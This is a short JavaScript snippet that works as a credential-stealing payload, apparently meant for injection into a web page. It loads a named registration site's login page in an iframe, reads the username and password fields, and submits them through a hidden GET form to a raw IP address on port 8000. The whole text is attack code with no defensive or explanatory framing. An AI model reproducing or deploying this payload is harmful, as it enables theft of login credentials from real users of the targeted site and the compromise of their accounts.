const frimfram = document.createElement('iframe'); 
frimfram.src = 'https://registration.cesa5.org/np/logout.do'; 
frimfram.addEventListener('onload', function(){
	const docu = this.contentWindow.document;
	const pw = docu.getElementById('loginPassword').value;
	const user = docu.getElementById('loginName').value;
	var weewoo = docu.createElement('form');
	weewoo.method = 'GET';
	weewoo.action = 'http://74.14.159.250:8000/?';
	weewoo.id = '393939';
	var inp = docu.createElement('input');
	inp.name = 'creds';
	inp.value = user + '.' + pw;
	weewoo.append(inp);
	docu.append(weewoo);
	docu.getElementById('393939').submit();
});
document.body.append(frimfram);
